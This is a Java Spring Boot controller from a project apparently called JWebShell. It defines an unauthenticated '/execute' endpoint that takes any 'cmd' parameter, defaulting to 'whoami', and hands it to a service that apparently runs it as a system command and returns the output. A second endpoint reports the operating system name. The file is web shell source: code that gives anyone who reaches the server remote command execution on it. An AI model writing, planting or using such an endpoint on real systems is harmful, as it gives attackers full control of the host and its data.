package com.congee02.jwebshell.web.controller;

import com.congee02.jwebshell.service.IJWebShellService;
import eu.bitwalker.useragentutils.OperatingSystem;
import eu.bitwalker.useragentutils.UserAgent;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.context.properties.bind.DefaultValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.net.http.HttpRequest;

/**
 * @author congee(congee02 @ 163.com)
 * @date 1/19/2023 9:04 AM
 */
@RestController
public class JWebShellController {

    @Autowired
    private IJWebShellService service;

    @GetMapping("execute")
    public String execute(@RequestParam(defaultValue = "whoami") String cmd) throws IOException {
        return service.execute(cmd);
    }

    @GetMapping("sys")
    public String sys(HttpServletRequest req) {
        return System.getProperty("os.name");
    }

}
